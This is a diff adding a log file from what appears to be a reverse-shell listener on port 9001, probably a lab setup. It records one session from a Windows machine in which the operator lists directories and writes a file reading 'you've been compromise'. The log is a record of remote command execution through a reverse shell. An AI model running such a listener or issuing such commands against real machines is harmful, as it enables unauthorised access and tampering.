@@ -1,0 +1,17 @@
+2025-09-29 13:39:23 - Server started on 0.0.0.0:9001
+2025-09-29 13:44:01 - New connection from ('10.0.2.15', 49920) (Session 1)
+2025-09-29 13:44:01 - Session 1: Reverse shell connected!
+Current directory: C:\Users\intriga\Desktop\Nouveau dossier\dist
+2025-09-29 13:44:07 - Session 1 executed: dir
+2025-09-29 13:44:24 - Session 1 executed: dir *.* intrigawashere.txt
+2025-09-29 13:44:31 - Session 1 executed: dir
+2025-09-29 13:45:31 - Session 1 executed: echo. > intrigawashere.txt
+2025-09-29 13:45:46 - Session 1 executed: intrigawashere.txt
+2025-09-29 13:46:29 - Session 1 executed: echo you've been compromise > intrigawashere.txt
+2025-09-29 13:47:21 - Send error: [Errno 104] Connection reset by peer
+2025-09-29 13:47:21 - Session 1 closed
+2025-09-29 13:47:22 - Server stopped by user
+2025-09-29 13:47:23 - Server started on 0.0.0.0:9001
+2025-09-29 13:47:46 - Server stopped by user
+2025-09-29 13:47:57 - Server started on 0.0.0.0:9001
+2025-09-29 13:50:43 - Server stopped by user
